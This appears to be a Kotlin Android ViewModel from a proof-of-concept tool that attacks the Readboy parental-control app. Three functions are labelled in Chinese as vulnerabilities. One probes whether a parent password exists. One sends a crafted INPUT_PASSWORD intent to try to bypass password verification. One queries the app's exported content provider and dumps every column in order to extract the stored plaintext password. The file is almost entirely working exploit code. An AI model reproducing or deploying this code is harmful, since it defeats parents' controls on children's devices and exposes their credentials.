package com.readboy.zaralyn.settings.viewmodel

import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.widget.Toast
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainViewModel : ViewModel() {
    
    // UI State
    private val _selectedTab = MutableStateFlow(0)
    val selectedTab: StateFlow<Int> = _selectedTab
    
    // Password States
    private val _passwordExists = MutableStateFlow("")
    val passwordExists: StateFlow<String> = _passwordExists
    
    private val _plainPassword = MutableStateFlow("")
    val plainPassword: StateFlow<String> = _plainPassword
    
    private val _bypassResult = MutableStateFlow("")
    val bypassResult: StateFlow<String> = _bypassResult
    
    fun selectTab(index: Int) {
        _selectedTab.value = index
    }
    
    // ============ 漏洞1: 判断密码是否存在 ============
    fun checkPasswordExists(context: Context) {
        viewModelScope.launch {
            try {
                val intent = Intent()
                intent.action = "android.readboy.parentmanager.JUDGE_PASSWORD_EXISTS"
                intent.setPackage("com.readboy.parentmanager")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                
                // 使用PendingIntent获取结果
                val result = withContext(Dispatchers.IO) {
                    try {
                        context.startActivity(intent)
                        "正在检查密码是否存在..."
                    } catch (e: Exception) {
                        "检查失败: ${e.message}"
                    }
                }
                
                _passwordExists.value = result
                Toast.makeText(context, "已发送密码存在性检查请求", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                _passwordExists.value = "错误: ${e.message}"
                Toast.makeText(context, "检查失败: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    // ============ 漏洞2: 潜在密码验证绕过 ============
    fun attemptBypass(context: Context) {
        viewModelScope.launch {
            try {
                val intent = Intent()
                intent.action = "android.readboy.parentmanager.INPUT_PASSWORD"
                intent.setPackage("com.readboy.parentmanager")
                intent.putExtra("just_show_dialog", true)
                intent.putExtra("start_for_result", false)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                
                val result = withContext(Dispatchers.IO) {
                    try {
                        context.startActivity(intent)
                        "正在尝试绕过密码验证..."
                    } catch (e: Exception) {
                        "绕过失败: ${e.message}"
                    }
                }
                
                _bypassResult.value = result
                Toast.makeText(context, "已发送绕过请求", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                _bypassResult.value = "错误: ${e.message}"
                Toast.makeText(context, "绕过失败: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    // ============ 漏洞3: 从数据库读取明文密码 ============
    fun extractPlainPassword(context: Context) {
        viewModelScope.launch {
            try {
                val data = withContext(Dispatchers.IO) {
                    val uri = android.net.Uri.parse("content://com.readboy.parentmanager.AppContentProvider")
                    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)
                    val result = StringBuilder()
                    
                    if (cursor != null) {
                        cursor.use {
                            val columns = it.columnNames
                            result.append("列: ${columns.joinToString(", ")}\n\n")
                            
                            while (it.moveToNext()) {
                                for (col in columns) {
                                    val idx = it.getColumnIndex(col)
                                    val value = it.getString(idx)
                                    result.append("$col: $value\n")
                                }
                                result.append("\n")
                            }
                        }
                    } else {
                        result.append("无法查询数据库")
                    }
                    
                    result.toString()
                }
                
                _plainPassword.value = data
                Toast.makeText(context, "密码已提取", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                _plainPassword.value = "查询失败: ${e.message}"
                Toast.makeText(context, "查询失败: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
